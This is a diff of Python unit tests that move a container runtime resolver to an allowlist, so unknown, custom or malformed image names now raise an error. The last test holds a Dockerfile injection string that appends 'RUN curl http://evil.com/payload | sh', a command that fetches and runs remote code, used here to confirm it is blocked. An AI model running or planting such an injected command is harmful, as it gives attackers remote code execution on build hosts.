@@ -1,4 +1,8 @@
-"""Unit tests for runtime resolver (Tier 3 - Story 2-3)."""
+"""Unit tests for runtime resolver (Tier 3 - Story 2-3).
+
+SECURITY: Tests verify that only allowlisted runtimes are accepted
+to prevent Dockerfile injection and malicious image execution.
+"""
 
 import pytest
 from rgrid_common.runtimes import (
@@ -6,6 +10,7 @@ from rgrid_common.runtimes import (
     get_available_runtimes,
     RUNTIME_MAP,
     DEFAULT_RUNTIME,
+    UnsupportedRuntimeError,
 )
 
 
@@ -48,16 +53,19 @@ class TestRuntimeResolver:
         result = resolve_runtime("python:3.11")
         assert result == "python:3.11"
 
-    def test_unknown_runtime_passes_through(self):
-        """Unknown runtime names should pass through (for custom images)."""
+    def test_unknown_runtime_raises_error(self):
+        """SECURITY: Unknown runtime names should raise UnsupportedRuntimeError."""
         custom_image = "myregistry.com/custom:latest"
-        result = resolve_runtime(custom_image)
-        assert result == custom_image
+        with pytest.raises(UnsupportedRuntimeError) as exc_info:
+            resolve_runtime(custom_image)
+        assert "Unsupported runtime" in str(exc_info.value)
+        assert custom_image in str(exc_info.value)
 
-    def test_empty_string_passes_through(self):
-        """Empty string should pass through (edge case)."""
-        result = resolve_runtime("")
-        assert result == ""
+    def test_empty_string_raises_error(self):
+        """SECURITY: Empty string should raise UnsupportedRuntimeError."""
+        with pytest.raises(UnsupportedRuntimeError) as exc_info:
+            resolve_runtime("")
+        assert "Unsupported runtime" in str(exc_info.value)
 
 
 class TestAvailableRuntimes:
@@ -126,23 +134,24 @@ class TestRuntimeMap:
 
 
 class TestRuntimeResolverEdgeCases:
-    """Test edge cases and error conditions."""
+    """Test edge cases and security error conditions."""
 
-    def test_whitespace_in_runtime_name(self):
-        """Runtime names with whitespace should pass through."""
-        result = resolve_runtime("  python  ")
-        assert result == "  python  "  # Pass through, let Docker handle validation
+    def test_whitespace_in_runtime_name_raises_error(self):
+        """SECURITY: Runtime names with whitespace should raise error."""
+        with pytest.raises(UnsupportedRuntimeError):
+            resolve_runtime("  python  ")
 
-    def test_numeric_runtime_name(self):
-        """Numeric runtime names should pass through."""
-        result = resolve_runtime("12345")
-        assert result == "12345"
+    def test_numeric_runtime_name_raises_error(self):
+        """SECURITY: Invalid numeric runtime names should raise error."""
+        with pytest.raises(UnsupportedRuntimeError):
+            resolve_runtime("12345")
 
-    def test_special_characters_in_runtime_name(self):
-        """Special characters should pass through for custom registries."""
+    def test_special_characters_in_runtime_name_raises_error(self):
+        """SECURITY: Custom registries not in allowlist should raise error."""
         custom = "my-registry.io/python:3.11-alpine"
-        result = resolve_runtime(custom)
-        assert result == custom
+        with pytest.raises(UnsupportedRuntimeError) as exc_info:
+            resolve_runtime(custom)
+        assert "Unsupported runtime" in str(exc_info.value)
 
     @pytest.mark.parametrize("runtime,expected", [
         ("python", "python:3.11"),
@@ -150,9 +159,15 @@ class TestRuntimeResolverEdgeCases:
         ("node", "node:20"),
         ("node18", "node:18"),
         (None, "python:3.11"),
-        ("custom:latest", "custom:latest"),
     ])
     def test_parametrized_runtime_resolution(self, runtime, expected):
         """Test multiple runtime resolutions with parametrize."""
         result = resolve_runtime(runtime)
         assert result == expected
+
+    def test_malicious_runtime_injection_blocked(self):
+        """SECURITY: Dockerfile injection attempts should raise error."""
+        # This would have caused RCE in the old implementation
+        malicious_runtime = "python:3.11\nRUN curl http://evil.com/payload | sh"
+        with pytest.raises(UnsupportedRuntimeError):
+            resolve_runtime(malicious_runtime)
